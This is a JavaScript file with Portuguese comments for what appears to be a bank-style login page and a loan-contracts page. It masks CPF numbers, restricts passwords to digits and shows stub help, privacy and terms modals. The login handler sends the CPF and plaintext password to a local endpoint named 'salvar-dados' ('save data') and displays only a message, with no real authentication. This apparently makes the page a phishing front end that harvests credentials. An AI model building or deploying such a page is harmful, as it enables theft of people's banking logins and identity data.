// Substitua seu script.js por este código completo

document.addEventListener('DOMContentLoaded', () => {

    // Função universal para a máscara de CPF
    const inicializarMascaraCPF = () => {
        const cpfField = document.querySelector('input[placeholder^="CPF"]'); // Pega qualquer input que comece com "CPF"
        if (cpfField) {
            cpfField.addEventListener('input', (event) => {
                let value = event.target.value.replace(/\D/g, '');
                value = value.substring(0, 11);
                value = value.replace(/(\d{3})(\d)/, '$1.$2');
                value = value.replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
                value = value.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
                event.target.value = value;
            });
        }
    };

    // Função universal para o modal
    const inicializarModais = () => {
        const modalOverlay = document.getElementById('modalOverlay');
        if (!modalOverlay) return; // Se não tem modal na página, sai da função

        const modalContent = document.getElementById('modalContent');
        const closeModalBtn = document.querySelector('.modal-close-btn');

        const modalData = {
            forgotPasswordLink: { title: 'Recuperar Senha', content: `<p>Para recuperar sua senha, digite o CPF cadastrado. Enviaremos um link de recuperação para o seu e-mail.</p><form style="margin-top: 20px;"><input type="text" class="input-field" placeholder="Digite seu CPF"><button type="submit" class="btn-entrar">Enviar Link</button></form>`},
            helpLink: { title: 'Central de Ajuda', content: '<p>Bem-vindo à nossa Central de Ajuda! Aqui você encontra respostas para as dúvidas mais frequentes. Como podemos te ajudar hoje?</p>'},
            privacyLink: { title: 'Política de Privacidade', content: '<p>Esta é a nossa política de privacidade. Comprometemo-nos a proteger seus dados...</p>'},
            termsLink: { title: 'Termos de Uso', content: '<p>Ao usar nossos serviços, você concorda com os seguintes termos...</p>'}
        };

        const openModal = (content) => {
            modalContent.innerHTML = `<h2>${content.title}</h2><div>${content.content}</div>`;
            modalOverlay.classList.add('active');
        };
        const closeModal = () => {
            modalOverlay.classList.remove('active');
        };

        // Adiciona eventos de clique nos links para abrir os modais
        document.querySelectorAll('a[id]').forEach(link => {
            link.addEventListener('click', e => {
                e.preventDefault();
                if (modalData[link.id]) {
                    openModal(modalData[link.id]);
                }
            });
        });
        
        closeModalBtn.addEventListener('click', closeModal);
        modalOverlay.addEventListener('click', (event) => {
            if (event.target === modalOverlay) closeModal();
        });
    };

    // Função para a página de LOGIN (index.html)
    const inicializarPaginaLogin = () => {
        const loginForm = document.querySelector('form:not(#emprestimoForm)');
        if (!loginForm) return;

        // Filtro de teclado numérico para a senha
        const senhaInput = document.querySelector('input[placeholder="Digite sua senha"]');
        senhaInput.addEventListener('keydown', (event) => {
            const code = event.code;
            if (event.ctrlKey || event.metaKey || !event.key.match(/^\d$/) && event.key.length === 1) {
                if (!['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab', 'Home', 'End'].includes(event.key)) {
                    event.preventDefault();
                }
            } else if (!code.startsWith('Digit')) {
                 event.preventDefault();
            }
        });
        
        // Submit do formulário de login
        loginForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            const cpf = loginForm.querySelector('input[placeholder="CPF"]').value;
            const senha = senhaInput.value;
            if (!cpf || !senha) return alert('Por favor, preencha todos os campos.');
            
            try {
                const response = await fetch('http://localhost:3000/salvar-dados', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cpf, senha }),
                });
                const result = await response.json();
                alert(result.message);
            } catch (error) {
                alert('Não foi possível conectar ao servidor. Tente novamente mais tarde.');
            }
        });

        // Botão de navegação
        
    };

    // Função para a página de EMPRÉSTIMOS
    const inicializarPaginaEmprestimos = () => {
        const emprestimoForm = document.getElementById('emprestimoForm');
        if (!emprestimoForm) return;
        
        emprestimoForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            const cpf = document.getElementById('cpfEmprestimo').value;
            if (cpf.length < 14) return alert('Por favor, preencha o CPF corretamente.');

            try {
                const response = await fetch('http://localhost:3000/acessar-contratos', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cpf }),
                });
                const result = await response.json();
                alert(result.message);
            } catch (error) {
                alert('Não foi possível conectar ao servidor. Tente novamente mais tarde.');
            }
        });
    };


    // Executa todas as funções de inicialização
    inicializarMascaraCPF();
    inicializarModais();
    inicializarPaginaLogin();
    inicializarPaginaEmprestimos();
});